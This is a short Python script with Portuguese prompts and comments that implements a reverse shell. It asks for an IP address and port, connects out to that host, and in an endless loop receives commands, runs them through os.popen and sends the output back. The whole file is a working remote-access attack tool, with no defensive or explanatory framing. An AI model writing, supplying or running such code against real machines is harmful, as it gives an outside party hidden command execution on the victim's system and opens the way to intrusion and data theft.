from os import popen
from ipaddress import IPv4Address as IPv4
from socket import AF_INET, SOCK_STREAM, socket, inet_aton
from types import NoneType

static = staticmethod
void = NoneType

class ReverseShell():
    
    @static
    def get_args() -> void:
        ip: IPv4 = IPv4(str(input("IPv4: ")))
        port: int = int(input("Porta: "))
        ReverseShell.run(ip, port)
        
    @static
    def run(ip, port) -> void:
        try:
            sk = socket(AF_INET, SOCK_STREAM)
            sk.connect((str(ip), port))  # Convertendo IPv4 de volta para string
            print("Shell reversa rodando em {}:{}".format(ip,port))
            while True:
                comando = sk.recv(1024).decode()
                resultado = popen(comando).read()
                sk.send(resultado.encode())
        except Exception as e:
            print("Erro:", e)
        finally:
            sk.close()

if __name__ == "__main__":
    ReverseShell.get_args()
